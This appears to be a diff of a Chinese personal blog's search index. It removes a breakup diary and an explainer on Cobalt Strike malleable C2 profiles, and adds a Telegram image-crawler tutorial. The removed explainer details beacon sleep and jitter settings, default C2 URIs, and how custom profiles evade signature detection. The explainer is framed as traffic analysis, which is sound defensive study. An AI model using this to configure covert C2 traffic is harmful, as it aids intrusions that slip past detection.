-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-      <categories>
-        <category>Daily</category>
-      </categories>
-      <tags>
-        <tag>Daily life</tag>
       </tags>
   </entry>
   <entry>
@@ -902,209 +994,44 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2026/02/27/%E4%B8%8D%E4%BC%9A%E5%BC%B9%E9%92%A2%E7%90%B4%E7%9A%84%E7%86%8A/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="不会弹钢琴的熊"><a href="#不会弹钢琴的熊" class="headerlink" title="不会弹钢琴的熊"></a>不会弹钢琴的熊</h2><h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>二月二六，彻夜未眠，心如刀绞。</p>
-<p>我导出了一月九号至今所有的聊天记录，哭着看了一遍。</p>
-<p>这二三月的时间我哭的比两三年时间加起来都多，我竟然变成了一个爱哭鬼。</p>
-<p>我把情侣手环退了，把粉色小猪拆开了，它应该跟小熊做个伴。</p>
-<p>我是个好人嘛，我不知道；思思是个好人，我一直这么认为的。</p>
-<p>思思在我眼里一直闪闪发光，她是我见过最坦荡、最纯粹的灵魂，我喜欢她，喜欢最真实的她。</p>
-<p>思思走了，我留不住。</p>
-<p>思思让我一定要遵守承诺，因为我是个好人，我一直哭着，我终于说了好的。</p>
-<p>可是我的心好痛啊，好痛好痛啊！</p>
-<p>我不愿意接受，可是我坚持似乎也没有意义了。</p>
-<p>那我就当个好人吧，哪怕被爱的人用刀指着。</p>
-<p>我应该很安静，安静的掉眼泪。</p>
-<h3 id="0x01-最开始的不合适先生"><a href="#0x01-最开始的不合适先生" class="headerlink" title="0x01 最开始的不合适先生"></a>0x01 最开始的不合适先生</h3><p>我和她的相识其实并不体面，更像是一场狼狈的偶遇。【12.17】</p>
-<p>我们像两只淋了雨的野狗，基于多种巧合碰面，抖落一身水珠，然后凑近彼此。</p>
-<p>我先开了口，于是她把心事全倒给了我，而我莫名接住了它们，仿佛自己本该是个容器。</p>
-<p>我成了她的情感导师。</p>
-<p>她开始带着侵略性挑逗着我，像是在逗着一只小狗。</p>
-<p>我总说着我们不合适，她总说着不合适可以先试试。</p>
-<p>“要不我们试试吧？”</p>
-<p>“不谈！”</p>
-<p>“……”</p>
-<p>“我们试试吧？”</p>
-<p>“好呀宝宝！”</p>
-<p>她不喜欢我，我也没喜欢上她，奇怪的占有欲却随着假性关系的扮演开始肆意生长，我成了后面她口中的那个“精神病”。【12.28】</p>
-<p>她依然陷在情绪的泥沼里，挣扎着，低语着：“老师，我忍不住想他。”</p>
-<p>而我也只能一遍遍回答着：“我在我在。”</p>
-<p>那些天的对话每天都快超过十个小时。她想回头，更想报复——不惜以自己为代价。</p>
-<p>我不忍心看到这个结果，于是我决定帮她。</p>
-<p>我以为她撞了南墙会回头的，但是我却看到她固执撞了一次、两次、三次…</p>
-<p>她说我是个好人，把我拉黑了。【01.06】</p>
-<h3 id="0x02-故事在这里开始"><a href="#0x02-故事在这里开始" class="headerlink" title="0x02 故事在这里开始"></a>0x02 故事在这里开始</h3><p>故事其实本该在没有开始的时候就终止。</p>
-<p>我清楚知道她对我只是逢场作戏，她只是需要一个树洞，而我很幸运的处于她安全范围内。</p>
-<p>我发觉我对她的好感快速增长着，我朋友说我像个精神病一样失去了理智。</p>
-<p>她回来了。【01.09】</p>
-<p>她说她需要我，我告诉她我喜欢她。</p>
-<p>她说她也喜欢我，但我知道这是假的。</p>
-<p>可是我说的是真的，我直面了我的真心，也做出了我的决定。</p>
-<p>她说她叫思思。</p>
-<p>思思呀是个胆小鬼，她不认为我会接受她的一切，她像一个刺猬，竖起尖刺来保护自己。</p>
-<p>思思开始控制我的社交，开始翻找我的回忆，开始试探我的边界。</p>
-<p>我喜欢她，于是我任由思思耍着小性子，也任由思思对我开发和探寻。</p>
-<p>思思说她开始喜欢我了，如果我和她在一起，她也许会很坏，但是一定不会伤害我，她和我保证。【01.16】</p>
-<p>我开始变成了爱哭鬼，这是我第二次因为思思的话哭了。</p>
-<p>上一次是思思说她其实看到了我年末的帖子。</p>
-<p>我第一次感觉到自己被爱着了。</p>
-<h3 id="0x03-我只要唯一的爱"><a href="#0x03-我只要唯一的爱" class="headerlink" title="0x03 我只要唯一的爱"></a>0x03 我只要唯一的爱</h3><p>思思第一次触及到了我真正的底线，她说她谈了一个新男友。</p>
-<p>爱怎么能分享呢？</p>
-<p>我只要唯一的爱。</p>
-<p>我浑身无力，理智脑不在，情感脑好像也有点死了。</p>
-<p>我只能强压下心中的不适，按照记忆中走过的路再走一遍，删除，拉黑，断联。【01.18】</p>
-<p>这是我第二次删除思思的微信，我们整整三天没有联系。</p>
-<p>我的小红薯账号注销了。【01.21】</p>
-<p>我看着它注销的，早上上班情绪反扑，没有忍住直接请假回家休息了，甚至在骑车途中落下泪来。</p>
-<p>回到家，我开始借着写碎碎念开始处理情绪反扑的事情。</p>
-<p>刚写到一半，突然收到了思思的微信好友申请，我原以为她应该把我微信也删了的。</p>
-<p>思思打通我电话的时候，我甚至没有把情绪调整过来。</p>
-<p>我们大吵了一架，我不再吃思思所有的套路，我也变成了一只刺猬。</p>
-<p>思思想和我搞ss关系，想让我当她国内的恋人，她说她有在谈的人，但是还没成为男朋友。</p>
-<p>我第三次删除了她的微信。</p>
-<p>思思找了我快一个小时，又把我加了回来。</p>
-<p>思思喊我老公，说她真的喜欢我，不会再和别人谈了，但是要我发喊她爸爸的视频。</p>
-<p>思思喜欢面子，但是我没有什么脸皮的，我只要爱，唯一的爱就够了。</p>
-<p>这是我们真正的开始。</p>
-<h3 id="0x04-恋人的生日礼物"><a href="#0x04-恋人的生日礼物" class="headerlink" title="0x04 恋人的生日礼物"></a>0x04 恋人的生日礼物</h3><p>0x05 争吵</p>
-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-  </entry>
-  <entry>
-    <title>CobaltStrike配置文件详解</title>
-    <url>/2022/09/14/CobaltStrike%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="CobaltStrike配置文件详解"><a href="#CobaltStrike配置文件详解" class="headerlink" title="CobaltStrike配置文件详解"></a>CobaltStrike配置文件详解</h1><p>Cobalt Strike使用配置文件中存在的值来生成beacon payload，用户创建配置文件，并使用可扩展命令和C2配置文件语言来设置值。配置文件指定beacon将如何在事件中改变和存储数据。</p>
-<p>在配置文件中，选项分为全局选项和局部选项。全局选项更新全局 Beacon 设置，而本地选项是特定于事件的。一个事件中的本地选项更改不会影响其他事件的输出。</p>
-<p>配置文件分为多个部分，规定 C2 通信不同部分的值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># this is a comment</span><br><span class="line">set global_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">protocol-transaction &#123;</span><br><span class="line">     set local_option &quot;value&quot;;</span><br><span class="line"> </span><br><span class="line">     client &#123;</span><br><span class="line">          # customize client indicators</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     server &#123;</span><br><span class="line">          # customize server indicators</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>基于Telegram机器人的图片爬虫</title>
+    <url>/2021/12/20/%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96telegram%E5%8F%91%E5%9B%BE%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本文将详细介绍如何通过Python爬虫技术，从Telegram的图片机器人获取图片内容，并将这些图片集成到QQ机器人中实现跨平台转发功能。</p>
+<h2 id="技术实现流程"><a href="#技术实现流程" class="headerlink" title="技术实现流程"></a>技术实现流程</h2><h3 id="1-获取Telegram图片链接"><a href="#1-获取Telegram图片链接" class="headerlink" title="1. 获取Telegram图片链接"></a>1. 获取Telegram图片链接</h3><p>首先通过Telegram客户端操作获取目标机器人的图片分享链接：</p>
+<ol>
+<li>选择需要爬取的机器人消息</li>
+<li>点击”转发”选项</li>
+<li>选择”复制链接”</li>
+</ol>
+<p><a href="/images/image-20211220103054655.png" title="image-20211220103054655" class="gallery-item"><img src="/images/image-20211220103054655.png" alt="image-20211220103054655"></a></p>
+<p>典型链接格式为：<code>https://t.me/botmzt/XXXX?single</code>，其中<code>XXXX</code>为图片的唯一数字编号。</p>
+<h3 id="2-分析图片存放机制"><a href="#2-分析图片存放机制" class="headerlink" title="2. 分析图片存放机制"></a>2. 分析图片存放机制</h3><p>通过浏览器开发者工具分析图片加载过程：</p>
+<ol>
+<li>在浏览器中打开获得的链接</li>
+<li>按F12打开开发者工具</li>
+<li>切换到”网络(Network)”标签</li>
+<li>观察图片资源的实际请求地址</li>
+</ol>
+<p><a href="/images/image-20211220123312110.png" title="image-20211220123312110" class="gallery-item"><img src="/images/image-20211220123312110.png" alt="image-20211220123312110"></a></p>
+<p>可以发现实际图片请求常带有<code>embed=1&amp;single=1</code>参数。</p>
+<h3 id="3-实现爬虫代码"><a href="#3-实现爬虫代码" class="headerlink" title="3. 实现爬虫代码"></a>3. 实现爬虫代码</h3><p>基于Python实现完整的爬虫功能：</p>
+<p>然后分析<a href="https://t.me/botmzt/XXXX?embed=1&single=1%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%BE%E7%89%87%E5%AF%B9%E5%BA%94%E7%9A%84url%E3%80%82%E5%90%8C%E6%97%B6%E6%89%BE%E5%88%B0%E6%97%A0%E5%9B%BE%E7%89%87%E6%97%B6%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%88%A4%E5%88%AB%E6%9D%A1%E4%BB%B6">https://t.me/botmzt/XXXX?embed=1&amp;single=1的源码，找到图片对应的url。同时找到无图片时的源码，作为一个判别条件</a></p>
+<p>通过之前文章的代理内容，我们可以写爬虫代码直接下载图片内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置部分</span></span><br><span class="line">prefix_url = <span class="string">&quot;https://t.me/botmzt/&quot;</span></span><br><span class="line">suffix_url = <span class="string">&quot;?embed=1&amp;single=1&quot;</span></span><br><span class="line">file_url = <span class="string">&quot;./picCache/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelegramImageCrawler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_latest_image_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取最新的图片编号&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 实现省略.</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">self, image_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;下载指定编号的图片&quot;&quot;&quot;</span></span><br><span class="line">        target_url = <span class="string">f&quot;<span class="subst">&#123;prefix_url&#125;</span><span class="subst">&#123;image_num&#125;</span><span class="subst">&#123;suffix_url&#125;</span>&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(target_url, proxies=proxies, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        pic_data = soup.find_all(<span class="string">&#x27;a&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;js-message_photo&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pic_data:</span><br><span class="line">            img_style = pic_data[<span class="number">0</span>][<span class="string">&#x27;style&#x27;</span>]</span><br><span class="line">            img_url = re.search(<span class="string">&#x27;https:.*?jpg&#x27;</span>, img_style).group()</span><br><span class="line">            </span><br><span class="line">            img_data = <span class="variable language_">self</span>.session.get(img_url, proxies=proxies, headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/data/images/<span class="subst">&#123;image_num&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_download</span>(<span class="params">self, start_num, end_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;批量下载图片&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在下载图片 #<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.download_image(num)</span><br></pre></td></tr></table></figure>
 
-<h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><p>全局选项对于 C2 通信来说是全局的。睡眠时间和时间抖动等选项定义了 Beacon 与团队服务器通信的频率。以下是一些带有示例值的全局选项的列表：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;Profile Name&quot;;</span><br><span class="line">set sleeptime &quot;30000&quot;;</span><br><span class="line">set jitter    &quot;20&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;;</span><br><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842">Cobalt Strike 用户指南</a></p>
-</blockquote>
-<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>另一方面，本地选项的范围仅限于每个事件。一项事件的选项不会影响另一项事件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set uri &quot;URI_For HTTP transaction&quot;;</span><br><span class="line">set verb &quot;POST&quot;;</span><br><span class="line">set uri_x86 &quot;StagetURI_for_x86&quot;;</span><br><span class="line">set uri_x64 &quot;StagetURI_for_x64&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>除了这些选项之外，配置文件还可以指定不同的协议来执行不同的操作。以下是示例以及对其用法的简要说明：</p>
-<ul>
-<li><p>http-stager: Beacon 是一个分阶段的有效负载。stager 下载文件并将其注入内存。此事件中列出的值正在自定义用于下载信标的 HTTP 通信。</p>
-</li>
-<li><p>dns-beacon: 在 Cobalt Strike v4.3 之后，DNS 选项成为dns-beacon事件的一部分。此事件修改 DNS C2 通信。</p>
-<blockquote>
-<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm#_Toc65482850">Cobalt Strike 用户指南</a>。</p>
-</blockquote>
-</li>
-<li><p>http-get： http -get事件自定义 Beacon 和团队服务器之间的 HTTP 通信。Beacon 首先发送 HTTP 请求，其中包含有关受感染系统的元数据。如果团队服务器有任务要执行，服务器会发送一个 HTTP 响应。</p>
-</li>
-<li><p>http**-**post：一旦 Beacon 执行服务器发送的任务，任务的输出就会在http-post事件中传输。当任务输出发送到服务器时，此事件中列出的值会影响 HTTP 通信。</p>
-</li>
-<li><p>https-certificate：如果 Beacon 的任务是通过 HTTPS 进行通信，则团队服务器会生成一个自签名证书。团队服务器使用http-get和http-post事件值来创建实际的 HTTP 请求和响应。此配置文件事件可以帮助指定 SSL 证书的不同参数。</p>
-<blockquote>
-<p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_self-signed-ssl-certificates.htm#_Toc65482846">Cobalt Strike 用户指南。</a></p>
-</blockquote>
-</li>
-</ul>
-<p><a href="/images/word-image-32.png" title="图 1. Cobalt Strike 默认配置文件" class="gallery-item"><img src="/images/word-image-32.png" alt="图 1. Cobalt Strike 默认配置文件"></a></p>
-<p>图 1. Cobalt Strike 默认配置文件</p>
-<h2 id="Cobalt-Strike-默认配置文件"><a href="#Cobalt-Strike-默认配置文件" class="headerlink" title="Cobalt Strike 默认配置文件"></a>Cobalt Strike 默认配置文件</h2><p>如果未指定其他自定义配置文件，则将加载默认配置文件。上面的图 1 是默认配置文件的规范，下面的图 2 是使用 Cobalt Strike 团队服务器中的网络驱动下载选项从默认配置文件捕获流量的示例。</p>
-<p><a href="/images/word-image-33.png" title="图 2. 从默认配置文件中捕获的示例流量" class="gallery-item"><img src="/images/word-image-33.png" alt="图 2. 从默认配置文件中捕获的示例流量"></a></p>
-<p>从图 2 中，您可以看到有几个 GET 和 POST 请求和响应的 HTTP 事务。</p>
-<ul>
-<li>对于 GET 请求，大多数请求 URI 都非常短并且具有预定义的模式。URI 是从图 1 中默认配置文件的set uri下指定的 URI 列表中随机选择的（完整列表请参见下表 1）。如果恶意攻击者使用在http-get部分中设置 uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。这也解释了为什么基于模式的签名可以很好地使用默认配置文件捕获 Cobalt Strike 流量，但无法使用自定义配置文件捕获任何变化。</li>
-<li>对于 POST 请求，URI 中有一个预定义的模式 - &#x2F;submit.php?id&#x3D;。ID 值是随机生成的。与 HTTP GET 请求的可能性类似，如果恶意攻击者在http-post部分使用带有set uri选项的自定义配置文件，他们可以轻松地将 URI 修改为任意字符串。</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Index</th>
-<th>URIs</th>
-<th>Index</th>
-<th>URIs</th>
-<th>Index</th>
-<th>URIs</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>&#x2F;ca</td>
-<td>8</td>
-<td>&#x2F;fwlink</td>
-<td>15</td>
-<td>&#x2F;push</td>
-</tr>
-<tr>
-<td>2</td>
-<td>&#x2F;dpixel</td>
-<td>9</td>
-<td>&#x2F;cm</td>
-<td>16</td>
-<td>&#x2F;ptj</td>
-</tr>
-<tr>
-<td>3</td>
-<td>&#x2F;__utm.gif</td>
-<td>10</td>
-<td>&#x2F;cx</td>
-<td>17</td>
-<td>&#x2F;j.ad</td>
-</tr>
-<tr>
-<td>4</td>
-<td>&#x2F;pixel.gif</td>
-<td>11</td>
-<td>&#x2F;pixel</td>
-<td>18</td>
-<td>&#x2F;ga.js</td>
-</tr>
-<tr>
-<td>5</td>
-<td>&#x2F;g.pixel</td>
-<td>12</td>
-<td>&#x2F;match</td>
-<td>19</td>
-<td>&#x2F;en_US&#x2F;all.js</td>
-</tr>
-<tr>
-<td>6</td>
-<td>&#x2F;dot.gif</td>
-<td>13</td>
-<td>&#x2F;visit.js</td>
-<td>20</td>
-<td>&#x2F;activity</td>
-</tr>
-<tr>
-<td>7</td>
-<td>&#x2F;updates.rss</td>
-<td>14</td>
-<td>&#x2F;load</td>
-<td>21</td>
-<td>&#x2F;IE9CompatViewList.xml</td>
-</tr>
-</tbody></table>
-<p>表 1. Cobalt Strike 默认配置文件中指定的可能 URI</p>
-<h2 id="定制的-Cobalt-Strike-Profile"><a href="#定制的-Cobalt-Strike-Profile" class="headerlink" title="定制的 Cobalt Strike Profile"></a>定制的 Cobalt Strike Profile</h2><p>Public Malleable C2 配置文件可以在公共存储库中下载，例如<a href="https://github.com/rsmudge/Malleable-C2-Profiles">GitHub </a>的官方配置文件示例。这些配置文件可以由团队服务器加载并用作 C2 通信的信标下载。</p>
-<h3 id="全局选项"><a href="#全局选项" class="headerlink" title="全局选项"></a>全局选项</h3><ul>
-<li>sleeptime：信标响应的睡眠时间为 5000 毫秒 (5s)。</li>
-<li>Jitter：设置%的时间抖动为0。在本例中，由于jitter值为0，Beacon会每隔5s回调一次。</li>
-<li>Maxdns：通过 DNS 上传数据时，主机名的最大长度为 255。</li>
-<li>UserAgent：将 HTTP C2请求用户代理设置为”Mozilla&#x2F;5.0(compatible; MSIE 8.0;Windows NT 6.1;Trident&#x2F;5.0)”</li>
-</ul>
-<p><a href="/images/word-image-34.png" title="图 3. Etumbot 配置文件中的全局选项" class="gallery-item"><img src="/images/word-image-34.png" alt="图 3. Etumbot 配置文件中的全局选项"></a></p>
-<h3 id="信标通过-HTTP-GET-请求从-teamserver获取任务"><a href="#信标通过-HTTP-GET-请求从-teamserver获取任务" class="headerlink" title="信标通过 HTTP GET 请求从 teamserver获取任务"></a>信标通过 HTTP GET 请求从 teamserver获取任务</h3><p>在全局选项下方，我们可以找到以下关于 HTTP 请求和响应的选项配置。下面的图 4 和图 5 显示了这种配置，其中包括客户端和服务器的 URI、标头和元数据信息。</p>
-<p>红色框突出显示了示例 Malleable C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、元数据编码算法、URI 中附加的元数据、HTTP 响应标头、加密和编码为响应正文的任务数据。</p>
-<p><a href="/images/word-image-35.png" title="图 4. Etumbot 配置文件中的 HTTP GET 请求选项" class="gallery-item"><img src="/images/word-image-35.png" alt="图 4. Etumbot 配置文件中的 HTTP GET 请求选项"></a></p>
-<p><a href="/images/word-image-36.png" title="图 5. 实时流量中的 HTTP GET 请求" class="gallery-item"><img src="/images/word-image-36.png" alt="图 5. 实时流量中的 HTTP GET 请求"></a></p>
-<h3 id="Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver"><a href="#Beacon-通过-HTTP-POST-请求将任务执行结果提交到-teamserver" class="headerlink" title="Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver"></a>Beacon 通过 HTTP POST 请求将任务执行结果提交到 teamserver</h3><p>我们可以从下面的图 6 中找到以下关于 HTTP 响应的选项配置，以及图 7 中 POST C2 流量的样子。</p>
-<p>红色框突出显示了示例可扩展 C2 配置文件中的 HTTP 请求 URI、HTTP 请求标头、附加在 URI 中的 HTTP 请求 sessionID、用于命令执行结果的 HTTP 请求有效负载、HTTP 响应标头和 HTTP 响应正文。</p>
-<p><a href="/images/word-image-37.png" title="图 6. Etumbot 配置文件中的 HTTP POST 请求选项" class="gallery-item"><img src="/images/word-image-37.png" alt="图 6. Etumbot 配置文件中的 HTTP POST 请求选项"></a></p>
-<p>红色框突出显示了可扩展 C2 配置文件示例中的 HTTP URI 路径、Netbios 编码的会话 ID、HTTP URI 路径后缀、HTTP 请求标头、HTTP 请求 UA、Base64 编码的任务执行结果和 HTTP 响应标头。<a href="/images/word-image-38.png" title="图 7. 实时流量中的 HTTP POST 请求选项" class="gallery-item"><img src="/images/word-image-38.png" alt="图 7. 实时流量中的 HTTP POST 请求选项"></a></p>
+<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
+<li><strong>代理配置</strong>：使用SOCKS5代理访问Telegram</li>
+<li><strong>异常处理</strong>：检测<code>tgme_widget_message_error</code>类判断无效消息</li>
+<li><strong>图片识别</strong>：通过BeautifulSoup解析DOM结构获取图片URL</li>
+<li><strong>文件存储</strong>：将下载的图片按编号保存到本地</li>
+</ol>
+<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2><p>将爬虫功能集成到go-cqhttp机器人的基本思路：</p>
+<ol>
+<li>设置定时任务定期检查新图片</li>
+<li>下载新图片到本地存储</li>
+<li>通过QQ机器人接口发送图片</li>
+<li>记录已处理的图片编号防止重复</li>
+</ol>
 </div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
         var options = {
             selector: '.gallery-item'
@@ -1112,11 +1039,10 @@
         lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
         }</script>]]></content>
       <categories>
-        <category>Traffic Analysis</category>
+        <category>Daily</category>
       </categories>
       <tags>
-        <tag>Study life</tag>
-        <tag>Traffic Analysis</tag>
+        <tag>Daily life</tag>
       </tags>
   </entry>
 </search>
